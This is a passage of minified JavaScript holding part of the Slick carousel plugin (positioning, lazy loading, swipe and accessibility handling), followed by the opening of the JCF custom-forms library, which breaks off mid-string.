n.slideOffset=0,t=n.$slides.first().outerHeight(!0),!0===n.options.infinite?(n.slideCount>n.options.slidesToShow&&(n.slideOffset=n.slideWidth*n.options.slidesToShow*-1,s=-1,!0===n.options.vertical&&!0===n.options.centerMode&&(2===n.options.slidesToShow?s=-1.5:1===n.options.slidesToShow&&(s=-2)),r=t*n.options.slidesToShow*s),n.slideCount%n.options.slidesToScroll!=0&&i+n.options.slidesToScroll>n.slideCount&&n.slideCount>n.options.slidesToShow&&(i>n.slideCount?(n.slideOffset=(n.options.slidesToShow-(i-n.slideCount))*n.slideWidth*-1,r=(n.options.slidesToShow-(i-n.slideCount))*t*-1):(n.slideOffset=n.slideCount%n.options.slidesToScroll*n.slideWidth*-1,r=n.slideCount%n.options.slidesToScroll*t*-1))):i+n.options.slidesToShow>n.slideCount&&(n.slideOffset=(i+n.options.slidesToShow-n.slideCount)*n.slideWidth,r=(i+n.options.slidesToShow-n.slideCount)*t),n.slideCount<=n.options.slidesToShow&&(n.slideOffset=0,r=0),!0===n.options.centerMode&&n.slideCount<=n.options.slidesToShow?n.slideOffset=n.slideWidth*Math.floor(n.options.slidesToShow)/2-n.slideWidth*n.slideCount/2:!0===n.options.centerMode&&!0===n.options.infinite?n.slideOffset+=n.slideWidth*Math.floor(n.options.slidesToShow/2)-n.slideWidth:!0===n.options.centerMode&&(n.slideOffset=0,n.slideOffset+=n.slideWidth*Math.floor(n.options.slidesToShow/2)),e=!1===n.options.vertical?i*n.slideWidth*-1+n.slideOffset:i*t*-1+r,!0===n.options.variableWidth&&(o=n.slideCount<=n.options.slidesToShow||!1===n.options.infinite?n.$slideTrack.children(".slick-slide").eq(i):n.$slideTrack.children(".slick-slide").eq(i+n.options.slidesToShow),e=!0===n.options.rtl?o[0]?-1*(n.$slideTrack.width()-o[0].offsetLeft-o.width()):0:o[0]?-1*o[0].offsetLeft:0,!0===n.options.centerMode&&(o=n.slideCount<=n.options.slidesToShow||!1===n.options.infinite?n.$slideTrack.children(".slick-slide").eq(i):n.$slideTrack.children(".slick-slide").eq(i+n.options.slidesToShow+1),e=!0===n.options.rtl?o[0]?-1*(n.$slideTrack.width()-o[0].offsetLeft-o.width()):0:o[0]?-1*o[0].offsetLeft:0,e+=(n.$list.width()-o.outerWidth())/2)),e},e.prototype.getOption=e.prototype.slickGetOption=function(i){return this.options[i]},e.prototype.getNavigableIndexes=function(){var i,e=this,t=0,o=0,s=[];for(!1===e.options.infinite?i=e.slideCount:(t=-1*e.options.slidesToScroll,o=-1*e.options.slidesToScroll,i=2*e.slideCount);t<i;)s.push(t),t=o+e.options.slidesToScroll,o+=e.options.slidesToScroll<=e.options.slidesToShow?e.options.slidesToScroll:e.options.slidesToShow;return s},e.prototype.getSlick=function(){return this},e.prototype.getSlideCount=function(){var e,t,o=this;return t=!0===o.options.centerMode?o.slideWidth*Math.floor(o.options.slidesToShow/2):0,!0===o.options.swipeToSlide?(o.$slideTrack.find(".slick-slide").each(function(s,n){if(n.offsetLeft-t+i(n).outerWidth()/2>-1*o.swipeLeft)return e=n,!1}),Math.abs(i(e).attr("data-slick-index")-o.currentSlide)||1):o.options.slidesToScroll},e.prototype.goTo=e.prototype.slickGoTo=function(i,e){this.changeSlide({data:{message:"index",index:parseInt(i)}},e)},e.prototype.init=function(e){var t=this;i(t.$slider).hasClass("slick-initialized")||(i(t.$slider).addClass("slick-initialized"),t.buildRows(),t.buildOut(),t.setProps(),t.startLoad(),t.loadSlider(),t.initializeEvents(),t.updateArrows(),t.updateDots(),t.checkResponsive(!0),t.focusHandler()),e&&t.$slider.trigger("init",[t]),!0===t.options.accessibility&&t.initADA(),t.options.autoplay&&(t.paused=!1,t.autoPlay())},e.prototype.initADA=function(){var e=this,t=Math.ceil(e.slideCount/e.options.slidesToShow),o=e.getNavigableIndexes().filter(function(i){return i>=0&&i<e.slideCount});e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({"aria-hidden":"true",tabindex:"-1"}).find("a, input, button, select").attr({tabindex:"-1"}),null!==e.$dots&&(e.$slides.not(e.$slideTrack.find(".slick-cloned")).each(function(t){var s=o.indexOf(t);i(this).attr({role:"tabpanel",id:"slick-slide"+e.instanceUid+t,tabindex:-1}),-1!==s&&i(this).attr({"aria-describedby":"slick-slide-control"+e.instanceUid+s})}),e.$dots.attr("role","tablist").find("li").each(function(s){var n=o[s];i(this).attr({role:"presentation"}),i(this).find("button").first().attr({role:"tab",id:"slick-slide-control"+e.instanceUid+s,"aria-controls":"slick-slide"+e.instanceUid+n,"aria-label":s+1+" of "+t,"aria-selected":null,tabindex:"-1"})}).eq(e.currentSlide).find("button").attr({"aria-selected":"true",tabindex:"0"}).end());for(var s=e.currentSlide,n=s+e.options.slidesToShow;s<n;s++)e.$slides.eq(s).attr("tabindex",0);e.activateADA()},e.prototype.initArrowEvents=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.off("click.slick").on("click.slick",{message:"previous"},i.changeSlide),i.$nextArrow.off("click.slick").on("click.slick",{message:"next"},i.changeSlide),!0===i.options.accessibility&&(i.$prevArrow.on("keydown.slick",i.keyHandler),i.$nextArrow.on("keydown.slick",i.keyHandler)))},e.prototype.initDotEvents=function(){var e=this;!0===e.options.dots&&(i("li",e.$dots).on("click.slick",{message:"index"},e.changeSlide),!0===e.options.accessibility&&e.$dots.on("keydown.slick",e.keyHandler)),!0===e.options.dots&&!0===e.options.pauseOnDotsHover&&i("li",e.$dots).on("mouseenter.slick",i.proxy(e.interrupt,e,!0)).on("mouseleave.slick",i.proxy(e.interrupt,e,!1))},e.prototype.initSlideEvents=function(){var e=this;e.options.pauseOnHover&&(e.$list.on("mouseenter.slick",i.proxy(e.interrupt,e,!0)),e.$list.on("mouseleave.slick",i.proxy(e.interrupt,e,!1)))},e.prototype.initializeEvents=function(){var e=this;e.initArrowEvents(),e.initDotEvents(),e.initSlideEvents(),e.$list.on("touchstart.slick mousedown.slick",{action:"start"},e.swipeHandler),e.$list.on("touchmove.slick mousemove.slick",{action:"move"},e.swipeHandler),e.$list.on("touchend.slick mouseup.slick",{action:"end"},e.swipeHandler),e.$list.on("touchcancel.slick mouseleave.slick",{action:"end"},e.swipeHandler),e.$list.on("click.slick",e.clickHandler),i(document).on(e.visibilityChange,i.proxy(e.visibility,e)),!0===e.options.accessibility&&e.$list.on("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().on("click.slick",e.selectHandler),i(window).on("orientationchange.slick.slick-"+e.instanceUid,i.proxy(e.orientationChange,e)),i(window).on("resize.slick.slick-"+e.instanceUid,i.proxy(e.resize,e)),i("[draggable!=true]",e.$slideTrack).on("dragstart",e.preventDefault),i(window).on("load.slick.slick-"+e.instanceUid,e.setPosition),i(e.setPosition)},e.prototype.initUI=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.show(),i.$nextArrow.show()),!0===i.options.dots&&i.slideCount>i.options.slidesToShow&&i.$dots.show()},e.prototype.keyHandler=function(i){var e=this;i.target.tagName.match("TEXTAREA|INPUT|SELECT")||(37===i.keyCode&&!0===e.options.accessibility?e.changeSlide({data:{message:!0===e.options.rtl?"next":"previous"}}):39===i.keyCode&&!0===e.options.accessibility&&e.changeSlide({data:{message:!0===e.options.rtl?"previous":"next"}}))},e.prototype.lazyLoad=function(){function e(e){i("img[data-lazy]",e).each(function(){var e=i(this),t=i(this).attr("data-lazy"),o=i(this).attr("data-srcset"),s=i(this).attr("data-sizes")||n.$slider.attr("data-sizes"),r=document.createElement("img");r.onload=function(){e.animate({opacity:0},100,function(){o&&(e.attr("srcset",o),s&&e.attr("sizes",s)),e.attr("src",t).animate({opacity:1},200,function(){e.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading")}),n.$slider.trigger("lazyLoaded",[n,e,t])})},r.onerror=function(){e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),n.$slider.trigger("lazyLoadError",[n,e,t])},r.src=t})}var t,o,s,n=this;if(!0===n.options.centerMode?!0===n.options.infinite?s=(o=n.currentSlide+(n.options.slidesToShow/2+1))+n.options.slidesToShow+2:(o=Math.max(0,n.currentSlide-(n.options.slidesToShow/2+1)),s=n.options.slidesToShow/2+1+2+n.currentSlide):(o=n.options.infinite?n.options.slidesToShow+n.currentSlide:n.currentSlide,s=Math.ceil(o+n.options.slidesToShow),!0===n.options.fade&&(o>0&&o--,s<=n.slideCount&&s++)),t=n.$slider.find(".slick-slide").slice(o,s),"anticipated"===n.options.lazyLoad)for(var r=o-1,l=s,d=n.$slider.find(".slick-slide"),a=0;a<n.options.slidesToScroll;a++)r<0&&(r=n.slideCount-1),t=(t=t.add(d.eq(r))).add(d.eq(l)),r--,l++;e(t),n.slideCount<=n.options.slidesToShow?e(n.$slider.find(".slick-slide")):n.currentSlide>=n.slideCount-n.options.slidesToShow?e(n.$slider.find(".slick-cloned").slice(0,n.options.slidesToShow)):0===n.currentSlide&&e(n.$slider.find(".slick-cloned").slice(-1*n.options.slidesToShow))},e.prototype.loadSlider=function(){var i=this;i.setPosition(),i.$slideTrack.css({opacity:1}),i.$slider.removeClass("slick-loading"),i.initUI(),"progressive"===i.options.lazyLoad&&i.progressiveLazyLoad()},e.prototype.next=e.prototype.slickNext=function(){this.changeSlide({data:{message:"next"}})},e.prototype.orientationChange=function(){var i=this;i.checkResponsive(),i.setPosition()},e.prototype.pause=e.prototype.slickPause=function(){var i=this;i.autoPlayClear(),i.paused=!0},e.prototype.play=e.prototype.slickPlay=function(){var i=this;i.autoPlay(),i.options.autoplay=!0,i.paused=!1,i.focussed=!1,i.interrupted=!1},e.prototype.postSlide=function(e){var t=this;t.unslicked||(t.$slider.trigger("afterChange",[t,e]),t.animating=!1,t.slideCount>t.options.slidesToShow&&t.setPosition(),t.swipeLeft=null,t.options.autoplay&&t.autoPlay(),!0===t.options.accessibility&&(t.initADA(),t.options.focusOnChange&&i(t.$slides.get(t.currentSlide)).attr("tabindex",0).focus()))},e.prototype.prev=e.prototype.slickPrev=function(){this.changeSlide({data:{message:"previous"}})},e.prototype.preventDefault=function(i){i.preventDefault()},e.prototype.progressiveLazyLoad=function(e){e=e||1;var t,o,s,n,r,l=this,d=i("img[data-lazy]",l.$slider);d.length?(t=d.first(),o=t.attr("data-lazy"),s=t.attr("data-srcset"),n=t.attr("data-sizes")||l.$slider.attr("data-sizes"),(r=document.createElement("img")).onload=function(){s&&(t.attr("srcset",s),n&&t.attr("sizes",n)),t.attr("src",o).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"),!0===l.options.adaptiveHeight&&l.setPosition(),l.$slider.trigger("lazyLoaded",[l,t,o]),l.progressiveLazyLoad()},r.onerror=function(){e<3?setTimeout(function(){l.progressiveLazyLoad(e+1)},500):(t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),l.$slider.trigger("lazyLoadError",[l,t,o]),l.progressiveLazyLoad())},r.src=o):l.$slider.trigger("allImagesLoaded",[l])},e.prototype.refresh=function(e){var t,o,s=this;o=s.slideCount-s.options.slidesToShow,!s.options.infinite&&s.currentSlide>o&&(s.currentSlide=o),s.slideCount<=s.options.slidesToShow&&(s.currentSlide=0),t=s.currentSlide,s.destroy(!0),i.extend(s,s.initials,{currentSlide:t}),s.init(),e||s.changeSlide({data:{message:"index",index:t}},!1)},e.prototype.registerBreakpoints=function(){var e,t,o,s=this,n=s.options.responsive||null;if("array"===i.type(n)&&n.length){s.respondTo=s.options.respondTo||"window";for(e in n)if(o=s.breakpoints.length-1,n.hasOwnProperty(e)){for(t=n[e].breakpoint;o>=0;)s.breakpoints[o]&&s.breakpoints[o]===t&&s.breakpoints.splice(o,1),o--;s.breakpoints.push(t),s.breakpointSettings[t]=n[e].settings}s.breakpoints.sort(function(i,e){return s.options.mobileFirst?i-e:e-i})}},e.prototype.reinit=function(){var e=this;e.$slides=e.$slideTrack.children(e.options.slide).addClass("slick-slide"),e.slideCount=e.$slides.length,e.currentSlide>=e.slideCount&&0!==e.currentSlide&&(e.currentSlide=e.currentSlide-e.options.slidesToScroll),e.slideCount<=e.options.slidesToShow&&(e.currentSlide=0),e.registerBreakpoints(),e.setProps(),e.setupInfinite(),e.buildArrows(),e.updateArrows(),e.initArrowEvents(),e.buildDots(),e.updateDots(),e.initDotEvents(),e.cleanUpSlideEvents(),e.initSlideEvents(),e.checkResponsive(!1,!0),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().on("click.slick",e.selectHandler),e.setSlideClasses("number"==typeof e.currentSlide?e.currentSlide:0),e.setPosition(),e.focusHandler(),e.paused=!e.options.autoplay,e.autoPlay(),e.$slider.trigger("reInit",[e])},e.prototype.resize=function(){var e=this;i(window).width()!==e.windowWidth&&(clearTimeout(e.windowDelay),e.windowDelay=window.setTimeout(function(){e.windowWidth=i(window).width(),e.checkResponsive(),e.unslicked||e.setPosition()},50))},e.prototype.removeSlide=e.prototype.slickRemove=function(i,e,t){var o=this;if(i="boolean"==typeof i?!0===(e=i)?0:o.slideCount-1:!0===e?--i:i,o.slideCount<1||i<0||i>o.slideCount-1)return!1;o.unload(),!0===t?o.$slideTrack.children().remove():o.$slideTrack.children(this.options.slide).eq(i).remove(),o.$slides=o.$slideTrack.children(this.options.slide),o.$slideTrack.children(this.options.slide).detach(),o.$slideTrack.append(o.$slides),o.$slidesCache=o.$slides,o.reinit()},e.prototype.setCSS=function(i){var e,t,o=this,s={};!0===o.options.rtl&&(i=-i),e="left"==o.positionProp?Math.ceil(i)+"px":"0px",t="top"==o.positionProp?Math.ceil(i)+"px":"0px",s[o.positionProp]=i,!1===o.transformsEnabled?o.$slideTrack.css(s):(s={},!1===o.cssTransitions?(s[o.animType]="translate("+e+", "+t+")",o.$slideTrack.css(s)):(s[o.animType]="translate3d("+e+", "+t+", 0px)",o.$slideTrack.css(s)))},e.prototype.setDimensions=function(){var i=this;!1===i.options.vertical?!0===i.options.centerMode&&i.$list.css({padding:"0px "+i.options.centerPadding}):(i.$list.height(i.$slides.first().outerHeight(!0)*i.options.slidesToShow),!0===i.options.centerMode&&i.$list.css({padding:i.options.centerPadding+" 0px"})),i.listWidth=i.$list.width(),i.listHeight=i.$list.height(),!1===i.options.vertical&&!1===i.options.variableWidth?(i.slideWidth=Math.ceil(i.listWidth/i.options.slidesToShow),i.$slideTrack.width(Math.ceil(i.slideWidth*i.$slideTrack.children(".slick-slide").length))):!0===i.options.variableWidth?i.$slideTrack.width(5e3*i.slideCount):(i.slideWidth=Math.ceil(i.listWidth),i.$slideTrack.height(Math.ceil(i.$slides.first().outerHeight(!0)*i.$slideTrack.children(".slick-slide").length)));var e=i.$slides.first().outerWidth(!0)-i.$slides.first().width();!1===i.options.variableWidth&&i.$slideTrack.children(".slick-slide").width(i.slideWidth-e)},e.prototype.setFade=function(){var e,t=this;t.$slides.each(function(o,s){e=t.slideWidth*o*-1,!0===t.options.rtl?i(s).css({position:"relative",right:e,top:0,zIndex:t.options.zIndex-2,opacity:0}):i(s).css({position:"relative",left:e,top:0,zIndex:t.options.zIndex-2,opacity:0})}),t.$slides.eq(t.currentSlide).css({zIndex:t.options.zIndex-1,opacity:1})},e.prototype.setHeight=function(){var i=this;if(1===i.options.slidesToShow&&!0===i.options.adaptiveHeight&&!1===i.options.vertical){var e=i.$slides.eq(i.currentSlide).outerHeight(!0);i.$list.css("height",e)}},e.prototype.setOption=e.prototype.slickSetOption=function(){var e,t,o,s,n,r=this,l=!1;if("object"===i.type(arguments[0])?(o=arguments[0],l=arguments[1],n="multiple"):"string"===i.type(arguments[0])&&(o=arguments[0],s=arguments[1],l=arguments[2],"responsive"===arguments[0]&&"array"===i.type(arguments[1])?n="responsive":void 0!==arguments[1]&&(n="single")),"single"===n)r.options[o]=s;else if("multiple"===n)i.each(o,function(i,e){r.options[i]=e});else if("responsive"===n)for(t in s)if("array"!==i.type(r.options.responsive))r.options.responsive=[s[t]];else{for(e=r.options.responsive.length-1;e>=0;)r.options.responsive[e].breakpoint===s[t].breakpoint&&r.options.responsive.splice(e,1),e--;r.options.responsive.push(s[t])}l&&(r.unload(),r.reinit())},e.prototype.setPosition=function(){var i=this;i.setDimensions(),i.setHeight(),!1===i.options.fade?i.setCSS(i.getLeft(i.currentSlide)):i.setFade(),i.$slider.trigger("setPosition",[i])},e.prototype.setProps=function(){var i=this,e=document.body.style;i.positionProp=!0===i.options.vertical?"top":"left","top"===i.positionProp?i.$slider.addClass("slick-vertical"):i.$slider.removeClass("slick-vertical"),void 0===e.WebkitTransition&&void 0===e.MozTransition&&void 0===e.msTransition||!0===i.options.useCSS&&(i.cssTransitions=!0),i.options.fade&&("number"==typeof i.options.zIndex?i.options.zIndex<3&&(i.options.zIndex=3):i.options.zIndex=i.defaults.zIndex),void 0!==e.OTransform&&(i.animType="OTransform",i.transformType="-o-transform",i.transitionType="OTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(i.animType=!1)),void 0!==e.MozTransform&&(i.animType="MozTransform",i.transformType="-moz-transform",i.transitionType="MozTransition",void 0===e.perspectiveProperty&&void 0===e.MozPerspective&&(i.animType=!1)),void 0!==e.webkitTransform&&(i.animType="webkitTransform",i.transformType="-webkit-transform",i.transitionType="webkitTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(i.animType=!1)),void 0!==e.msTransform&&(i.animType="msTransform",i.transformType="-ms-transform",i.transitionType="msTransition",void 0===e.msTransform&&(i.animType=!1)),void 0!==e.transform&&!1!==i.animType&&(i.animType="transform",i.transformType="transform",i.transitionType="transition"),i.transformsEnabled=i.options.useTransform&&null!==i.animType&&!1!==i.animType},e.prototype.setSlideClasses=function(i){var e,t,o,s,n=this;if(t=n.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden","true"),n.$slides.eq(i).addClass("slick-current"),!0===n.options.centerMode){var r=n.options.slidesToShow%2==0?1:0;e=Math.floor(n.options.slidesToShow/2),!0===n.options.infinite&&(i>=e&&i<=n.slideCount-1-e?n.$slides.slice(i-e+r,i+e+1).addClass("slick-active").attr("aria-hidden","false"):(o=n.options.slidesToShow+i,t.slice(o-e+1+r,o+e+2).addClass("slick-active").attr("aria-hidden","false")),0===i?t.eq(t.length-1-n.options.slidesToShow).addClass("slick-center"):i===n.slideCount-1&&t.eq(n.options.slidesToShow).addClass("slick-center")),n.$slides.eq(i).addClass("slick-center")}else i>=0&&i<=n.slideCount-n.options.slidesToShow?n.$slides.slice(i,i+n.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"):t.length<=n.options.slidesToShow?t.addClass("slick-active").attr("aria-hidden","false"):(s=n.slideCount%n.options.slidesToShow,o=!0===n.options.infinite?n.options.slidesToShow+i:i,n.options.slidesToShow==n.options.slidesToScroll&&n.slideCount-i<n.options.slidesToShow?t.slice(o-(n.options.slidesToShow-s),o+s).addClass("slick-active").attr("aria-hidden","false"):t.slice(o,o+n.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"));"ondemand"!==n.options.lazyLoad&&"anticipated"!==n.options.lazyLoad||n.lazyLoad()},e.prototype.setupInfinite=function(){var e,t,o,s=this;if(!0===s.options.fade&&(s.options.centerMode=!1),!0===s.options.infinite&&!1===s.options.fade&&(t=null,s.slideCount>s.options.slidesToShow)){for(o=!0===s.options.centerMode?s.options.slidesToShow+1:s.options.slidesToShow,e=s.slideCount;e>s.slideCount-o;e-=1)t=e-1,i(s.$slides[t]).clone(!0).attr("id","").attr("data-slick-index",t-s.slideCount).prependTo(s.$slideTrack).addClass("slick-cloned");for(e=0;e<o+s.slideCount;e+=1)t=e,i(s.$slides[t]).clone(!0).attr("id","").attr("data-slick-index",t+s.slideCount).appendTo(s.$slideTrack).addClass("slick-cloned");s.$slideTrack.find(".slick-cloned").find("[id]").each(function(){i(this).attr("id","")})}},e.prototype.interrupt=function(i){var e=this;i||e.autoPlay(),e.interrupted=i},e.prototype.selectHandler=function(e){var t=this,o=i(e.target).is(".slick-slide")?i(e.target):i(e.target).parents(".slick-slide"),s=parseInt(o.attr("data-slick-index"));s||(s=0),t.slideCount<=t.options.slidesToShow?t.slideHandler(s,!1,!0):t.slideHandler(s)},e.prototype.slideHandler=function(i,e,t){var o,s,n,r,l,d=null,a=this;if(e=e||!1,!(!0===a.animating&&!0===a.options.waitForAnimate||!0===a.options.fade&&a.currentSlide===i))if(!1===e&&a.asNavFor(i),o=i,d=a.getLeft(o),r=a.getLeft(a.currentSlide),a.currentLeft=null===a.swipeLeft?r:a.swipeLeft,!1===a.options.infinite&&!1===a.options.centerMode&&(i<0||i>a.getDotCount()*a.options.slidesToScroll))!1===a.options.fade&&(o=a.currentSlide,!0!==t?a.animateSlide(r,function(){a.postSlide(o)}):a.postSlide(o));else if(!1===a.options.infinite&&!0===a.options.centerMode&&(i<0||i>a.slideCount-a.options.slidesToScroll))!1===a.options.fade&&(o=a.currentSlide,!0!==t?a.animateSlide(r,function(){a.postSlide(o)}):a.postSlide(o));else{if(a.options.autoplay&&clearInterval(a.autoPlayTimer),s=o<0?a.slideCount%a.options.slidesToScroll!=0?a.slideCount-a.slideCount%a.options.slidesToScroll:a.slideCount+o:o>=a.slideCount?a.slideCount%a.options.slidesToScroll!=0?0:o-a.slideCount:o,a.animating=!0,a.$slider.trigger("beforeChange",[a,a.currentSlide,s]),n=a.currentSlide,a.currentSlide=s,a.setSlideClasses(a.currentSlide),a.options.asNavFor&&(l=(l=a.getNavTarget()).slick("getSlick")).slideCount<=l.options.slidesToShow&&l.setSlideClasses(a.currentSlide),a.updateDots(),a.updateArrows(),!0===a.options.fade)return!0!==t?(a.fadeSlideOut(n),a.fadeSlide(s,function(){a.postSlide(s)})):a.postSlide(s),void a.animateHeight();!0!==t?a.animateSlide(d,function(){a.postSlide(s)}):a.postSlide(s)}},e.prototype.startLoad=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.hide(),i.$nextArrow.hide()),!0===i.options.dots&&i.slideCount>i.options.slidesToShow&&i.$dots.hide(),i.$slider.addClass("slick-loading")},e.prototype.swipeDirection=function(){var i,e,t,o,s=this;return i=s.touchObject.startX-s.touchObject.curX,e=s.touchObject.startY-s.touchObject.curY,t=Math.atan2(e,i),(o=Math.round(180*t/Math.PI))<0&&(o=360-Math.abs(o)),o<=45&&o>=0?!1===s.options.rtl?"left":"right":o<=360&&o>=315?!1===s.options.rtl?"left":"right":o>=135&&o<=225?!1===s.options.rtl?"right":"left":!0===s.options.verticalSwiping?o>=35&&o<=135?"down":"up":"vertical"},e.prototype.swipeEnd=function(i){var e,t,o=this;if(o.dragging=!1,o.swiping=!1,o.scrolling)return o.scrolling=!1,!1;if(o.interrupted=!1,o.shouldClick=!(o.touchObject.swipeLength>10),void 0===o.touchObject.curX)return!1;if(!0===o.touchObject.edgeHit&&o.$slider.trigger("edge",[o,o.swipeDirection()]),o.touchObject.swipeLength>=o.touchObject.minSwipe){switch(t=o.swipeDirection()){case"left":case"down":e=o.options.swipeToSlide?o.checkNavigable(o.currentSlide+o.getSlideCount()):o.currentSlide+o.getSlideCount(),o.currentDirection=0;break;case"right":case"up":e=o.options.swipeToSlide?o.checkNavigable(o.currentSlide-o.getSlideCount()):o.currentSlide-o.getSlideCount(),o.currentDirection=1}"vertical"!=t&&(o.slideHandler(e),o.touchObject={},o.$slider.trigger("swipe",[o,t]))}else o.touchObject.startX!==o.touchObject.curX&&(o.slideHandler(o.currentSlide),o.touchObject={})},e.prototype.swipeHandler=function(i){var e=this;if(!(!1===e.options.swipe||"ontouchend"in document&&!1===e.options.swipe||!1===e.options.draggable&&-1!==i.type.indexOf("mouse")))switch(e.touchObject.fingerCount=i.originalEvent&&void 0!==i.originalEvent.touches?i.originalEvent.touches.length:1,e.touchObject.minSwipe=e.listWidth/e.options.touchThreshold,!0===e.options.verticalSwiping&&(e.touchObject.minSwipe=e.listHeight/e.options.touchThreshold),i.data.action){case"start":e.swipeStart(i);break;case"move":e.swipeMove(i);break;case"end":e.swipeEnd(i)}},e.prototype.swipeMove=function(i){var e,t,o,s,n,r,l=this;return n=void 0!==i.originalEvent?i.originalEvent.touches:null,!(!l.dragging||l.scrolling||n&&1!==n.length)&&(e=l.getLeft(l.currentSlide),l.touchObject.curX=void 0!==n?n[0].pageX:i.clientX,l.touchObject.curY=void 0!==n?n[0].pageY:i.clientY,l.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(l.touchObject.curX-l.touchObject.startX,2))),r=Math.round(Math.sqrt(Math.pow(l.touchObject.curY-l.touchObject.startY,2))),!l.options.verticalSwiping&&!l.swiping&&r>4?(l.scrolling=!0,!1):(!0===l.options.verticalSwiping&&(l.touchObject.swipeLength=r),t=l.swipeDirection(),void 0!==i.originalEvent&&l.touchObject.swipeLength>4&&(l.swiping=!0,i.preventDefault()),s=(!1===l.options.rtl?1:-1)*(l.touchObject.curX>l.touchObject.startX?1:-1),!0===l.options.verticalSwiping&&(s=l.touchObject.curY>l.touchObject.startY?1:-1),o=l.touchObject.swipeLength,l.touchObject.edgeHit=!1,!1===l.options.infinite&&(0===l.currentSlide&&"right"===t||l.currentSlide>=l.getDotCount()&&"left"===t)&&(o=l.touchObject.swipeLength*l.options.edgeFriction,l.touchObject.edgeHit=!0),!1===l.options.vertical?l.swipeLeft=e+o*s:l.swipeLeft=e+o*(l.$list.height()/l.listWidth)*s,!0===l.options.verticalSwiping&&(l.swipeLeft=e+o*s),!0!==l.options.fade&&!1!==l.options.touchMove&&(!0===l.animating?(l.swipeLeft=null,!1):void l.setCSS(l.swipeLeft))))},e.prototype.swipeStart=function(i){var e,t=this;if(t.interrupted=!0,1!==t.touchObject.fingerCount||t.slideCount<=t.options.slidesToShow)return t.touchObject={},!1;void 0!==i.originalEvent&&void 0!==i.originalEvent.touches&&(e=i.originalEvent.touches[0]),t.touchObject.startX=t.touchObject.curX=void 0!==e?e.pageX:i.clientX,t.touchObject.startY=t.touchObject.curY=void 0!==e?e.pageY:i.clientY,t.dragging=!0},e.prototype.unfilterSlides=e.prototype.slickUnfilter=function(){var i=this;null!==i.$slidesCache&&(i.unload(),i.$slideTrack.children(this.options.slide).detach(),i.$slidesCache.appendTo(i.$slideTrack),i.reinit())},e.prototype.unload=function(){var e=this;i(".slick-cloned",e.$slider).remove(),e.$dots&&e.$dots.remove(),e.$prevArrow&&e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.remove(),e.$nextArrow&&e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.remove(),e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden","true").css("width","")},e.prototype.unslick=function(i){var e=this;e.$slider.trigger("unslick",[e,i]),e.destroy()},e.prototype.updateArrows=function(){var i=this;Math.floor(i.options.slidesToShow/2),!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&!i.options.infinite&&(i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false"),i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false"),0===i.currentSlide?(i.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false")):i.currentSlide>=i.slideCount-i.options.slidesToShow&&!1===i.options.centerMode?(i.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")):i.currentSlide>=i.slideCount-1&&!0===i.options.centerMode&&(i.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),i.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")))},e.prototype.updateDots=function(){var i=this;null!==i.$dots&&(i.$dots.find("li").removeClass("slick-active").end(),i.$dots.find("li").eq(Math.floor(i.currentSlide/i.options.slidesToScroll)).addClass("slick-active"))},e.prototype.visibility=function(){var i=this;i.options.autoplay&&(document[i.hidden]?i.interrupted=!0:i.interrupted=!1)},i.fn.slick=function(){var i,t,o=this,s=arguments[0],n=Array.prototype.slice.call(arguments,1),r=o.length;for(i=0;i<r;i++)if("object"==typeof s||void 0===s?o[i].slick=new e(o[i],s):t=o[i].slick[s].apply(o[i].slick,n),void 0!==t)return t;return o}});

/*!
 * JavaScript Custom Forms
 *
 * Copyright 2014-2015 PSD2HTML - http://psd2html.com/jcf
 * Released under the MIT license (LICENSE.txt)
 *
 * Version: 1.2.3
 */
!function(e,t){"use strict";"function"==typeof define&&define.amd?define(["jquery"],t):"object"==typeof exports?module.exports=t(require("jquery")):e.jcf=t(jQuery)}(this,function(e){"use strict";var t="1.2.3",n=[],o={optionsKey:"jcf",dataKey:"jcf-instance",rtlClass:"jcf-rtl",focusClass:"jcf-focus",pressedClass:"jcf-pressed",disabledClass:"jcf-disabled",hiddenClass:"jcf-hidden",resetAppearanceClass:"jcf-reset-appearance",unselectableClass:"jcf-unselectable"},a="ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,i=/Windows Phone/.test(navigator.userAgent);o.isMobileDevice=!(!a&&!i);var r=function(){var t=e("<style>").appendTo("head"),n=t.prop("sheet")||t.prop("styleSheet"),a=function(e,t,o){o=o||0,n.insertRule?n.insertRule(e+"{"+t+"}",o):n.addRule(e,t,o)};a("."+o.hiddenClass,"position:absolute !important;left:-9999px !important;height:1px !important;width:1px !important;margin:0 !important;border-width:0 !important;-webkit-appearance:none;-moz-appearance:none;appearance:none"),a("."+o.rtlClass+" ."+o.hiddenClass,"right:-9999px !important; left: auto !important"),a("."+o.unselectableClass,"-webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-tap-highlight-color: rgba(0,0,0,0);"),a("."+o.resetAppearanceClass,"background: none; border: none; -webkit-appearance: none; appearance: none; 